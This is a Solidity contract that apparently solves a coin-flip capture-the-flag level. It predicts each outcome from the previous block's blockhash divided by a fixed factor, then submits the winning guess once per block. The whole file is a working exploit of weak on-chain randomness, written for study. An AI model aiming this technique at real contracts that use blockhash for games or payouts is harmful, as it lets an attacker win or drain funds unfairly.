pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipSolver {
    using SafeMath for uint256;
    CoinFlip public challenge;
    uint256 lastHash;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address addr) public {
        challenge = CoinFlip(addr);
    }

    function solve() external payable {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            return;
        }

        lastHash = blockValue;

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        challenge.flip(side);
    }

    receive() external payable {}
}
